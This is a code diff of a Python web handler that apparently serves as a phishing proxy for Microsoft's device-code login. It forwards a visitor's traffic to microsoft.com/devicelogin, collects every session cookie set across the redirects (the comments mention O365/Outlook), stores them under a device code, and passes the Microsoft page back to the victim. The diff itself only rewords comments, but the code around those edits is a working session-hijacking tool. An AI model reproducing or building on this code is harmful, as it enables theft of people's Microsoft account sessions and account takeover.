@@ -149,7 +149,7 @@ async def proxy(device_code: str, request: Request):
     for n, c in session.get("cookies", {}).items():
         cookie_jar.set(n, c.get("value", ""), domain=".microsoftonline.com")
 
-    # ORIGINAL Microsoft device login URL with user_code
+    # ORIGINAL Microsoft device login page
     target_url = "https://microsoft.com/devicelogin"
 
     async with httpx.AsyncClient(cookies=cookie_jar, follow_redirects=True, timeout=60) as c:
@@ -161,7 +161,7 @@ async def proxy(device_code: str, request: Request):
             content=await request.body() if request.method != "GET" else None
         )
 
-    # Capture all cookies from every redirect (including O365/Outlook)
+    # Capture all cookies (O365/Outlook included)
     captured = {}
     for past in list(resp.history) + [resp]:
         for h in past.headers.getlist("set-cookie"):
@@ -175,7 +175,7 @@ async def proxy(device_code: str, request: Request):
     session["cookies"].update(captured)
     await save_session(device_code, session)
 
-    # Stream the original Microsoft page back to the user
+    # Stream original Microsoft page back
     content = resp.content
     if "text/html" in resp.headers.get("content-type", ""):
         html = resp.text
